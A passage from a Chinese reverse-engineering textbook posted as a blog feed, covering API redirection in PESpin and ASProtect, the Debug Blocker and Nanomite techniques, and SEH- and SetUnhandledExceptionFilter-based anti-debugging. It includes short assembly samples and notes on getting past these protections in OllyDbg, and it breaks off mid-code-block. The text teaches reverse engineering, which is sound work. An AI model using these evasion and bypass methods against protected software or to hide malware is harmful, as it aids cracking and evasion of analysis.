API重定向示例#1</h2><p>下面分析api_redirection1.exe示例程序，它在上面原代码的基础上应用了API重定向技术。</p><p>与原代码（图53-15湘比，IAT地址由原来的406000变为40FE1F，且40FE1F地址的值为3F0000（原代码中该地址为kernel32.dll内API的地址）。</p><blockquote><p>api_redirection1.exe文件是使用PESpin保护器的API重定向选项制作的。使用调试器进行运行时解压缩后，运行到OEP处就会出现上图中的（变形后的）原代码。解压缩后也应用API重定向技术。</p></blockquote><p>地址3F0000是保护器分配的内存区域的起始地址，保护器将主要的API代码复制到该地址区域。在图53-17中跟踪（StepInto（F7））位于4010B5地址处的CALL指令，查看3F0000地址处的代码。</p><p>从图53-18可以看到，代码中应用了扰乱代码对齐技术，跟踪JMP指令可以看到实际的API代码。</p><p>图53-19中的代码与实际的kernel32!GetCommandLineA()API代码（参考图53-16）完全相同。保护器将原API代码复制到该处。</p><p>保护器会像这样重新组织原程序的IAT,并全部修改调用相关API的代码。最终调用的不是Kernel32模块中的原API,而是3F0000地址区域中的API。</p><h2 id="53-6-3-API重定向示例-2"><a href="#53-6-3-API重定向示例-2" class="headerlink" title="53.6.3 API重定向示例#2"></a>53.6.3 API重定向示例#2</h2><p>下面看个更复杂的API重定向示例，该示例程序（api_redirection2.exe）是使用ASProtect的</p><p>Advanced Import Protection与Emulate standard system function功能制作的，如图53-20所示。</p><p>在原程序与本示例中比较4010B5地址处的CALL指令（参考图53-15）。</p><p>虽然2条CALL指令相同，但操作码却不同。操作码“FF15” 表示间接调用7C812FAD地址（该</p><p>地址存储在406000地址中）处的函数。操作码“E8” 表示直接调用（指定地址值（76EF46）加 上Next EIP（401 OBA）得到的）新地址（76EF46+4010BA&#x3D;B70000）中的代码。</p><p>原来的6字节CALL指令（FF15 00604000）被改为5字节CALL指令（E8</p><p>46EF7600）, 4010BA地址处仅剩下B8,这意味着代码中会出现代码对齐混乱效果（运 行B70000函数代码，返回地址被修改为与原代码相同的地址4010BB）。</p><p>B70000地址区域是ASProtect在脱壳过程中分配的众多内存区域之一（参考图53-21）。</p><p>跟踪进入（StepInto（F7））B70000函数，代码如图53-22所示。</p><p>从图中可以看到，代码中含有垃圾代码，也应用了扰乱代码对齐技术。实际的</p><p>GetCommandLineA()API代码要一段时间后才显示。</p><p>每次使用调试器转到B70000地址时，代码形态均不同。因为ASProtect的混淆代</p><p>码生成器每次都会生成新的垃圾代码。我们把这种能产生相同结果而又具有不同形态</p><p>的代码称为多态代码（Polymorphic Code）。前面还介绍过一种“混乱代码”（Obfuscated</p><p>Code），今后会经常用到它们，希望各位借此机会记住。图53-22中的代码同时具有“多</p><p>态代码”和“混乱代码”的特征（代码形态随时变化，我们很难把握）。</p><p>B70000地址处的代码是ASProtect添加的垃圾代码，用来设置调试障碍，增加调试难度。在</p><p>OllyDbg调试器中跟踪调试时，要运行约3万条指令（包含循环中反复调用的指令），然后返回原</p><p>代码中的4010BB地址处（参考图53-23）。</p><p>也就是说，原代码中的1条CALL DWORD PTR DS:[406000]指令被换成了3万条指令（除</p><p>Kernel32!GetCommandLineA()API夕卜，其他很多API也采用这种调用方式）。该方式执行效率非常</p><p>低，但是对保护代码与增加代码逆向分析难度来说，效果非常棒。</p><p>垃圾代码中包含实际调用API的代码，如图53-24所示。</p><p>与前面介绍的PESpin示例程序（api_redirectionl.exe）不同，该示例程序会直接调用头际</p><p>的kernel32!GetCommandLineA()API,并修改返回地址（4010BA—4010BB）,代码如图53-25</p><p>所示。</p><p>通过跟踪图53-20中4010B5地址处的CALL B70000指令调试到此，图53-25中[EAX]&#x3D;</p><p>[12FF3C]&#x3D;4010BA即是调用B70000函数后的返回地址。若直接返回4010BA地址就会引发错误，</p><p>所以，借助455E9D地址处的MOV指令将返回地址修改为4010BB，如图53-26所示。</p><p>图53-25的地址区域（455E9D）是ASProtect的代码节区区域（参考图53-21）。与 B70000区域一样，它不是为了生成垃圾代码而分配的内存区域，而是实实在在的</p><p>ASProtect的代码节区区域。</p><p>最后返回原代码的4010BB地址处，代码如图53-26所示</p><p>图53-26中的代码（B800B3）也是ASProtect创建的多态&amp;混乱代码，每次调试都会变化。</p><p>我们至此学习了具有复杂形态的API重定向示例，API重定向这种方式牺牲了代码的运行速</p><p>度，却大大提高了代码的复杂性，从而获得了很好的反调试效果。</p><p>若代码逆向分析人员事先并不知道程序中调用了哪些API（或者要花很长时间才能查明），就</p><p>会使代码逆向分析工作变得十分困难。因此，API重定向是一种相当有效的反调试技术，许多程</p><p>序保护器都支持它。</p><p>参考上面学过的内容，请各位亲自跟踪调试B70000处的函数。我借助OllyDbg的 “硬件断点”功能，获取了图53-25、图53-26中出现的455E9D与B800B3地址。进 入B70000函数后，返回地址存储在栈中，在ESP值（我在12FF3C地址处设置硬件断</p><p>点后获取了 455E9D地址）与4010BB地址处设置断点跟踪，就会见到B800B3地址处</p><p>的JMP指令。</p><p>API重定向技术在结构上与API钩取技术有很多类似的地方：它们都不直接调用原API，而是</p><p>添加自身代码并执行后再调用。二者最大的不同在于，它们的目的是不一样的：APJ重定向用来</p><p>增加代码调试的难度，而API钩取则用来在API调用前&#x2F;后添加另外的功能。</p><h1 id="53-7-Debug-Blocker（Self-Debugging）"><a href="#53-7-Debug-Blocker（Self-Debugging）" class="headerlink" title="53.7 Debug Blocker（Self Debugging）"></a>53.7 Debug Blocker（Self Debugging）</h1><p>Debug Blocker（Self Debugging）也是一种高级反调试技术，顾名思义，它在调试模式下运行自身进程。</p><p>图53-27中的PESpin（1.32）.exe进程为PESpin保护器。可以看到，同一进程以父进程（PID: 184） &#x2F; 子进程（PID: 1424）形式运行。其实，它们是调试器（PID: 184）与被调试者（PID: 1424）的关系。PESpin运行后会查找自身的可执行文件，然后以调试模式执行。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/05/img/%E7%AC%AC53%E7%AB%A0%20%E9%AB%98%E7%BA%A7%E5%8F%8D%E8%B0%83%E8%AF%95%E6%8A%80%E6%9C%AF.assets/image-20220326105401724.png#alt=image-20220326105401724"></p><blockquote><p>Debug Blocker是自我创建技术（以子进程形式运行自身进程）的演进形式。自我创建技术中，子进程负责执行实际原代码，父进程负责创建子进程、修改内存（代码&#x2F;数据）、更改EP地址等。所以仅调试父进程将无法转到OEP代码处，这样能起到很好的反调试效果。但调试时若用附加命令将子进程附加到调试器，这种反调试手法就会失去作用。Debug Blocker技术的出现正是为了弥补这一不足。</p></blockquote><p>Debug Blocker技术有如下优点。</p><p>第一，防止代码调试。因子进程运行实际的原代码且已处于调试之中，原则上就无法再使用其他调试器进行附加操作了（第57章中将介绍一种方法，它可以解决该问题并顺利实现调试）。</p><p>第二，能够控制子进程（Debuggee，被调试者）。调试器-被调试者关系中，调试器具有很大权限，可以处理被调试进程的异常、控制代码执行流程等。</p><p>Debug Blocker技术的第二个优点使代码调试变得非常困难。下面比较常规反调试技术与Debug Blocker技术。</p><p>图53-28左侧为应用常规SEH技术的反调试示例，右侧为应用Debug Blocker技术的反调试示例。常规SEH技术中，异常处理器代码位于相同的进程内存空间；但Debug Blocker技术中，（处理被调试进程所发异常的）异常处理器代码位于调试进程（请注意，对于被调试进程所发的异常，调试器拥有优先处理权）。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/05/img/%E7%AC%AC53%E7%AB%A0%20%E9%AB%98%E7%BA%A7%E5%8F%8D%E8%B0%83%E8%AF%95%E6%8A%80%E6%9C%AF.assets/image-20220326105841937.png#alt=image-20220326105841937"></p><p>所以，为了调试子进程，必须先断开与已有调试器的连接，但这样子进程又无法正常运行。这正是逆向分析Debug Blocker最难的部分。</p><p>第57章中将调试应用了Debug Blocker的示例程序，帮助各位进一步了解</p><blockquote><p>Nanomite技术由Debug Blocker技术发展而来，该技术会查找被调试进程内部的代码，将所有条件跳转指令（Jcc指令）修改为INT3（0xCC）指令（软件断点），或其他触发异常的代码。并且，调试器内部有表格，含有被修改的Jcc指令的实际地址位置以及要跳转的地址。执行被调试者内部修改后的指令就会触发异常，控制权即被转交给调试器。调试器通过发生异常的地址从（自身持有的）表格中获取要跳转的地址，然后通知被调试者。图53-29是含有条件跳转指令的原代码。</p></blockquote><p>使用PESpin保护器向前面的原代码应用Nanomite技术，出现如图53-30所示的代码。</p><p>认真比较可以发现，2个字节的Jcc&#x2F;MOV指令全部被修改为LEA EAX,EAX这类怪异的指令。执行这种代码时就会触发EXCEPTION_ILLEGAL_INSTURCTION异常，系统会将控制权转移给调试器。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/05/img/%E7%AC%AC53%E7%AB%A0%20%E9%AB%98%E7%BA%A7%E5%8F%8D%E8%B0%83%E8%AF%95%E6%8A%80%E6%9C%AF.assets/image-20220326110012955.png#alt=image-20220326110012955"></p><blockquote><p>若想正常调试这种应用了Nanomite技术的代码，需要把修改后的代码恢复为原代码。逐一手动修改会非常费力，大量恢复工作要实现自动化处理，这需要我们具备一定的编程思维与能力。所以，调试这种应用了Nanomite技术的代码是很有难度的。</p></blockquote><h1 id="53-8-小结"><a href="#53-8-小结" class="headerlink" title="53.8 小结"></a>53.8 小结</h1><p>本章讲解了PE保护器中常用的高级反调试技术的相关内容（随着反调试技术的不断发展，各种技术会应运而生）。</p><blockquote><p>我刚开始学习代码逆向分析技术时，曾经尝试调试ASProtector。连续分析了好几天，但是连OEP代码的边都没摸到，总是在奇怪的地方徘徊。这是因为受到了反调试代码的阻碍，这些代码常被称为“死亡代码”。若想顺利通过数量庞大的代码，必须坚信自己最后一定能够找到OEP代码。其实，陷入“死亡代码”的沼泽是绝对不可能找到OEP代码的。调试时会不断出现混乱代码，让人疲惫不堪。我当时跟踪调试这些代码时也深受其苦，最后竟然不知不觉间打起了瞌睡，那时才真正体会到反调试技术的可怕。这些反调试技术从精神与肉体上折磨逆向分析人员，打消他们调试代码的念头。两年后，我再次挑战ASProtector，学习从网络上获取的各种反调试相关资料，最终顺利达到OEP处，当时真是高兴坏了。</p></blockquote><blockquote><p>但那也只是回避了反调试技术而到达OEP处而已，其实仍未能完全掌握ASProtector的工作原理（内部算法）。我当时再次感受到自身的不足，觉得要学的东西还很多，一定要虚心学习。另一方面也认为编写该PE保护器的人实在太有水平了。各位的逆向分析技术达到一定水平后，我建议大家调试一下PE保护器。查找、学习相关资料，在调试过程中认真分析，相信各位会学到大量知识并积累丰富经验，进一步提高代码调试水平。</p></blockquote>]]></content>
    
    
    <categories>
      
      <category>Binary</category>
      
      <category>逆向工程核心原理</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Binary</tag>
      
      <tag>逆向工程核心原理</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>第52章 动态反调试技术</title>
    <link href="/1999/05/02/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/%E7%AC%AC52%E7%AB%A0%20%E5%8A%A8%E6%80%81%E5%8F%8D%E8%B0%83%E8%AF%95%E6%8A%80%E6%9C%AF/"/>
    <url>/1999/05/02/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/%E7%AC%AC52%E7%AB%A0%20%E5%8A%A8%E6%80%81%E5%8F%8D%E8%B0%83%E8%AF%95%E6%8A%80%E6%9C%AF/</url>
    
    <content type="html"><![CDATA[<p>第52章动态反调试技术</p><p>本章讲解动态组别中的反调试技术。运用动态反调试技术可以不断阻止对程序代码的跟踪调试。与静态反调试技术相比，动态反调试技术难度更高，破解难度也更大。</p><h1 id="52-1动态反调试技术的目的"><a href="#52-1动态反调试技术的目的" class="headerlink" title="52.1动态反调试技术的目的"></a>52.1动态反调试技术的目的</h1><p>反调试技术的目的就是隐藏和保护程序代码与数据，使之无法进行逆向分析。PE保护器中一般会大量应用动态反调试技术，以保护源程序的核心算法。在调试器中调试运行（应用了动态反调试技术的）.程序时，动态反调试技术就会干扰调试器，使之无法正常跟踪查找源程序的核心代码（OEP）。</p><blockquote><p>一名优秀的代码逆向分析入员能够克服各种困难，顺利完成逆向分析任务。但是分析应用了动态反调试技术的程序时，仍然会比较费力，且分析时间也会大大增加</p></blockquote><h1 id="52-2异常"><a href="#52-2异常" class="headerlink" title="52.2异常"></a>52.2异常</h1><p>异常（Exception)常用于反调试技术。正常运行的进程发生异常时，在SEH机制的作用下， OS会接收异常，然后调用进程中注册的SEH处理。但是，若进程（被调试者）在调试运行中发生异常，调试器就会接收处理。利用该特征可判断进程是正常运行还是调试运行，然后根据不同结果执行不同操作，这就是反调试技术的原理。</p><blockquote><p>关于利用SEH的反调试工作原理及破解之法请参考第48章。</p></blockquote><h2 id="52-2-1-SEH"><a href="#52-2-1-SEH" class="headerlink" title="52.2.1 SEH"></a>52.2.1 SEH</h2><p>代码52-1列出了Windows操作系统中的一些典型异常。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs c">STILL_ACTIVE(<span class="hljs-number">0x00000103</span>L)<br>EXCEPTION_ACCESS_VIOLATION(<span class="hljs-number">0xC0000005</span>L)<br>EXCEPTION_DATATYPE_MISALIGNMENT(<span class="hljs-number">0x80000002</span>L)<br>EXCEPTION_BREAKPOINT(<span class="hljs-number">0x80000003</span>L)<br>EXCEPTION_SINGLE_STEP(<span class="hljs-number">0x80000004</span>L)<br>EXCEPTION_ARRAY_BOUNDS_EXCEEDED(<span class="hljs-number">0xC000008C</span>L)<br>EXCEPTION_FLT_DENORMAL_OPERAND(<span class="hljs-number">0xC000008D</span>L)<br>EXCEPTION_FLT_DIVIDE_BY_ZERO(<span class="hljs-number">0xC000008E</span>L)<br>EXCEPTION_FLT_INEXACT_RESULT(<span class="hljs-number">0xC000008F</span>L)<br>EXCEPTION_FLT_INVALID_OPERATION(<span class="hljs-number">0xC0000090</span>L)<br>EXCEPTION_FLT_OVERFLOW(<span class="hljs-number">0xC0000091</span>L)<br>EXCEPTION_FLT_STACK_CHECK(<span class="hljs-number">0xC0000092</span>L)<br>EXCEPTION_FLT_UNDERFLOW(<span class="hljs-number">0xC0000093</span>L)<br>EXCEPTION_INT_DIVIDE_BY_ZERO(<span class="hljs-number">0xC0000094</span>L)<br>EXCEPTION_INT_OVERFLOW(<span class="hljs-number">0xC0000095</span>L)<br>EXCEPTION_PRIV_INSTRUCTION(<span class="hljs-number">0xC0000096</span>L)<br>EXCEPTION_IN_PAGE_ERROR(<span class="hljs-number">0xC0000006</span>L)<br>EXCEPTION_ILLEGAL_INSTRUCTION(<span class="hljs-number">0xC000001D</span>L)<br>EXCEPTION_NONCONTINUABLE_EXCEPTION(<span class="hljs-number">0xC0000025</span>L)<br>EXCEPTION_STACK_OVERFLOW(<span class="hljs-number">0xC00000FD</span>L)<br>EXCEPTION_INVALID_DISPOSITION(<span class="hljs-number">0xC0000026</span>L)<br>EXCEPTION_GUARD_PAGE(<span class="hljs-number">0x80000001</span>L)<br>EXCEPTION_INVALID_HANDLE(<span class="hljs-number">0xC0000008</span>L)<br>CONTROL_C_EXIT(<span class="hljs-number">0xC000013A</span>L)<br></code></pre></td></tr></table></figure><p><strong>EXCEPTION_BREAKPOINT</strong></p><p>Windows操作系统中最具代表性的异常是断点异常。Breakpoint指令触发异常时，若程序处于正常运行状态，则自动调用已经注册过的SEH;若程序处于调试运行状态，则系统会立刻停止运行程序，并将控制权转给调试器。一般而言，异常处理器中都含有修改EIP值的代码。修改调试器选项可以把处在调试中的进程产生的相关异常转给操作系统，自动调用SEH处理。但即便如此，在异常处理器中适当应用静态反调试技术，也能够轻松判断进程是否处于调试状态。此外，EIP值在异常处理器内部如何变化也不得而知，这意味着，必须跟踪进入异常处理器才能继续调试。</p><p>若程序中仅应用了几个基于SEH的反调试技法，则很容易破解。但若应用了数十乃至数百个这样的反调试技法，调试速度就会大大降低，失误的风险也会大增。</p><ul><li>练习</li></ul><p>先在OllyDbg调试器中打开示例程序（DynAD_SEH.exe)，然后在401000地址处设置好断点并运行，如图52-1所示。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/05/img/%E7%AC%AC52%E7%AB%A0%20%E5%8A%A8%E6%80%81%E5%8F%8D%E8%B0%83%E8%AF%95%E6%8A%80%E6%9C%AF.assets/image-20220323201434522.png#alt=image-20220323201434522"></p><p>图52-1中的代码是基于INT3异常的反调试代码，代码执行流如图52-2所示。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/05/img/%E7%AC%AC52%E7%AB%A0%20%E5%8A%A8%E6%80%81%E5%8F%8D%E8%B0%83%E8%AF%95%E6%8A%80%E6%9C%AF.assets/image-20220323201532130.png#alt=image-20220323201532130"></p><p>下面逐个分析代码执行流各阶段的代码（请各位边调试边跟着学习）。</p><p><strong>#1.安装SEH</strong></p><p>首先在以下代码中安装SEH （40102C）。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs assembly">00401011PUSH 40102C; SEH<br>00401016 PUSH DWORD PTR FS:[0]<br>0040101DMOV DWORD PTR FS:[0],ESP<br></code></pre></td></tr></table></figure><p><strong>#2.发生INT3异常</strong></p><p>以下代码用来触发INT3异常。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-number">00401024</span> INT3<br></code></pre></td></tr></table></figure><p><strong>#3-1.调试运行——终止进程</strong></p><p>若进程处于调试运行状态，则需要由调试器（此处为OllyDbg)处理异常。INT3指令是CPU中断（Interrupt)命令，<strong>在用户模式的调试器中什么也不做</strong>，继续执行其下的命令。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">00401025MOV EAX,-1; -1 (0xFFFFFFFF)<br>0040102AJMP EAX<br></code></pre></td></tr></table></figure><p>因进程处于调试中，故跳转到非法地址处（FFFFFFFF )，无法继续调试。</p><blockquote><p>以上练习示例中，进程处于调试状态时会直接终止运行，逆向分析入员能够借此轻松把握在什么地方遭受了反调试。但是有些保护器会将代码执行跳转到垃圾代码。逆向分析入员跟踪这些冗长的垃圾代码时会精疲力尽，而且进程终止时，也很难把握在哪里遭受了反调试技术的“狙击”。这是一种非常狡猾的伎俩，很容易让入陷入迷途。</p></blockquote><p><strong>#3-2.正常运行（非调试运行）——运行SEH</strong></p><p>若进程为非调试运行，那么执行到INT3指令时就会调用执行前面已经注册过的SEH。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs assembly">0040102CMOV EAX,DWORD PTR SS:[ESP+C]<br>00401031MOV EBX,401040<br>00401036MOV DWORD PTR DS:[EAX+B8],EBX<br>0040103DXOR EAX,EAX<br>0040103FRETN<br></code></pre></td></tr></table></figure><p><code>SS:[ESP+C]</code>是<code>CONTEXT *pContext</code>结构体的指针，而<code>CONTEXT *pContext</code>结构体正是SEH的第三个参数，它是一个发生异常的线程CONTEXT结构体。DS:[EAX+B8]指向pContext→Eip成员，所以401036地址处的MOV指令用来将该结构体的EIP值修改为401040。然后，异常处理器返回0 （ExceptionContinueExecution）。接下来，发生异常的线程再次从修改后的EIP地址处（401040)开始运行。SEH函数定义如下，请参考。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c">EXCEPTION_DISPOSITION <span class="hljs-title function_">ExceptHandler</span><br><span class="hljs-params">( </span><br><span class="hljs-params">    EXCEPTION_RECORD *pRecord,</span><br><span class="hljs-params">    EXCEPTION_REGISTRATION_RECORD*pFrame,</span><br><span class="hljs-params">    CONTEXT *pContext,</span><br><span class="hljs-params">    PVOID pValue</span><br><span class="hljs-params">)</span>;<br><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">enum</span> _<span class="hljs-title">EXCEPTION_DISPOSITION</span></span><br><span class="hljs-class">&#123;</span><br>ExceptionContinueExecution = <span class="hljs-number">0</span>,<span class="hljs-comment">// 继续执行代码</span><br>ExceptionContinueSearch = <span class="hljs-number">1</span>,<span class="hljs-comment">// 运行下一个异常处理器</span><br>ExceptionNestedException = <span class="hljs-number">2</span>,<span class="hljs-comment">// 在OS内部使用</span><br>ExceptionCollidedUnwind = <span class="hljs-number">3</span><span class="hljs-comment">// 在OS内部使用</span><br>&#125; EXCEPTION_DISPOSITION;<br></code></pre></td></tr></table></figure><p>以下是CONTEXT结构体的定义（已标出各成员的偏移量)。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">CONTEXT</span> &#123;</span><br><br>    DWORD ContextFlags;<br><br>    DWORD   Dr0; <span class="hljs-comment">// 04h</span><br>    DWORD   Dr1; <span class="hljs-comment">// 08h</span><br>    DWORD   Dr2; <span class="hljs-comment">// 0Ch</span><br>    DWORD   Dr3; <span class="hljs-comment">// 10h</span><br>    DWORD   Dr6; <span class="hljs-comment">// 14h</span><br>    DWORD   Dr7; <span class="hljs-comment">// 18h</span><br><br>    FLOATING_SAVE_AREA FloatSave;<br><br>    DWORD   SegGs; <span class="hljs-comment">// 88h</span><br>    DWORD   SegFs; <span class="hljs-comment">// 90h</span><br>    DWORD   SegEs; <span class="hljs-comment">// 94h</span><br>    DWORD   SegDs; <span class="hljs-comment">// 98h</span><br><br>    DWORD   Edi; <span class="hljs-comment">// 9Ch</span><br>    DWORD   Esi; <span class="hljs-comment">// A0h</span><br>    DWORD   Ebx; <span class="hljs-comment">// A4h</span><br>    DWORD   Edx; <span class="hljs-comment">// A8h</span><br>    DWORD   Ecx; <span class="hljs-comment">// ACh</span><br>    DWORD   Eax; <span class="hljs-comment">// B0h</span><br><br>    DWORD   Ebp; <span class="hljs-comment">// B4h</span><br>    DWORD   Eip; <span class="hljs-comment">// B8h</span><br>    DWORD   SegCs; <span class="hljs-comment">// BCh              // MUST BE SANITIZED</span><br>    DWORD   EFlags; <span class="hljs-comment">// C0h             // MUST BE SANITIZED</span><br>    DWORD   Esp; <span class="hljs-comment">// C4h</span><br>    DWORD   SegSs; <span class="hljs-comment">// C8h</span><br><br>    BYTE    ExtendedRegisters[MAXIMUM_SUPPORTED_EXTENSION];<br><br>&#125; CONTEXT;<br></code></pre></td></tr></table></figure><blockquote><p>若不处理异常且EIP值保持不变，返回ExceptionContinueExecution时会再次执行401024地址处的INT3指令，同时再次调用执行40102C地址处的SEH，最终陷入无限循环，造成栈溢出，导致进程终止。</p></blockquote><p><strong>#4.删除SEH</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">00401040POP DWORD PTR FS:[0]<br>00401047ADD ESP,4<br></code></pre></td></tr></table></figure><p>进程正常运行时，#1中注册的SEH（40102C）就会被删除（若进程处于调试运行，#3-1中的代码就会造成进程非正常终止)。</p><ul><li>破解之法</li></ul><p>如图52-3所示，在Debugging options对话框的Exceptions选项卡中，复选“INT3 breaks”后，调试器就会忽略被调试进程中发生的INT3异常，而由自身的SEH处理。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/05/img/%E7%AC%AC52%E7%AB%A0%20%E5%8A%A8%E6%80%81%E5%8F%8D%E8%B0%83%E8%AF%95%E6%8A%80%E6%9C%AF.assets/image-20220323203151621.png#alt=image-20220323203151621"></p><p>如图52-3设置好调试选项，进程调试过程中遇到INT3指令时，调试器不会停下来，而会自动调用执行被调试进程的SEH （与正常运行一样）。请各位自行测试，先分别在SEH（40102C）与代码正常运行处（401040）设置断点，然后按F9键运行程序。</p><blockquote><p>有时，在某些环境（OS、调试器插件Bug等）中使用StepInto（F7）或StepOver（F8）命令跟踪INT3指令会导致调试器非正常终止。遇到这种情况时，请按照以上说明设置好断点后再按F9运行程序。</p></blockquote><h2 id="52-2-2-SetUnhandledExceptionFilter"><a href="#52-2-2-SetUnhandledExceptionFilter" class="headerlink" title="52.2.2 SetUnhandledExceptionFilter()"></a>52.2.2 SetUnhandledExceptionFilter()</h2><p>进程中发生异常时，若SEH未处理或注册的SEH根本不存在，会发生什么呢？此时会调用执行系统的kernel32!UnhandledExceptionFilter() API。该函数内部会运行系统的最后一个异常处理器（名为Top Level Exception Filter或Last Exception Filter）。系统最后的异常处理器通常会弹出错误消息框，然后终止进程运行，如图52-4所示。</p><p>值得注意的是，kernel32!UnhandledExceptionFilter()内部调用了ntdll!NtQuerylnformationProcess（ProcessDebugPort）API （静态反调试技术），以判断是否正在调试进程。若进程正常运行（非调试运行），则运行系统最后的异常处理器；若进程处于调试中，则将异常派送给凋试器。通过kernel32!SetUnhandledExceptionFilter()API可以修改系统最后的异常处理器（Top Level Exception Filter），函数原型如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c">LPTOP_LEVEL_EXCEPTION_FILTER <span class="hljs-title function_">SetUnhandledExceptionFilter</span><span class="hljs-params">(</span><br><span class="hljs-params">  [in] LPTOP_LEVEL_EXCEPTION_FILTER lpTopLevelExceptionFilter</span><br><span class="hljs-params">)</span>;<br></code></pre></td></tr></table></figure><p>调用该函数修改系统最后异常处理器时，只要将新的Top Level Exception Filter函数地址传递给函数的IpTopLevelExceptionFilter参数即可（返回值为上一个Last Exception Filter函数地址）。TopLevel Exception Filter函数定义如下:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">EXCEPTION_POINTERS</span> &#123;</span><br>  PEXCEPTION_RECORD ExceptionRecord;<br>  PCONTEXT          ContextRecord;<br>&#125; EXCEPTION_POINTERS, *PEXCEPTION_POINTERS;<br><br>LONG <span class="hljs-title function_">TopLevelExceptionFilter</span><span class="hljs-params">(</span><br><span class="hljs-params">PEXCEPTION_POINTERS pExcept</span><br><span class="hljs-params">)</span>;<br></code></pre></td></tr></table></figure><p>基于异常的反调试技术中，通常先特意触发异常，然后在新注册的Last Exception Filter内部判断进程正常运行还是调试运行，并根据判断结果修改EIP值。系统在此过程中自行判断调试与否。这种反调试技术融合了静态与动态方法，下面通过练习示例进一步学习。</p><ul><li>练习</li></ul><p>首先在OllyDbg调试器中打开示例程序（DynAD_SUEF.exe），在401030地址处设置断点后运行（参考图52-5）。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/05/img/%E7%AC%AC52%E7%AB%A0%20%E5%8A%A8%E6%80%81%E5%8F%8D%E8%B0%83%E8%AF%95%E6%8A%80%E6%9C%AF.assets/image-20220323205323919.png#alt=image-20220323205323919"></p><p>下面边调试代码边了解程序执行流及反调试工作原理。首先调用printf()函数输出字符串，代码如下所示：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs assembly">00401030     55             PUSH EBP<br>00401031     8BEC           MOV EBP,ESP<br>00401033     68 A0994000    PUSH DynAD_SU.004099A0     ;  ASCII &quot;SEH : SetUnhandledExceptionFilter()<br>00401038     E8 4A000000    CALL DynAD_SU.00401087<br>0040103D     83C4 04        ADD ESP,4<br></code></pre></td></tr></table></figure><p>然后，调用SetUnhandledExceptionFilter()来注册新的Top Level Exception Filter（新的Exception Filter函数中包含异常处理代码）。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td 